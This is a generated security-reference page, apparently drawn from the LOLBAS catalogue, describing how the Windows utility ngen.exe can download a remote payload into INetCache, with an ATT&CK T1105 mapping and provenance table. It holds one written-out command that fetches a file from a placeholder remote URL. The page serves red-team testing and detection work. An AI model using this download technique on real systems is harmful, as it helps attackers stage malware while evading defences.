---
parsed_by: focuslocust
source: commands
type: generated
---
# Ngen Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Ngen.exe

Tool page: [Ngen.exe](../../tools/windows/ngen.exe.md)

### It will download a remote payload and place it in INetCache.

```text
ngen.exe {REMOTEURL}
```

Description:

Downloads payload from remote server using the Microsoft Native Image Generator utility.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ngen.yml` |
| Evidence | Command preserved from source parser. |
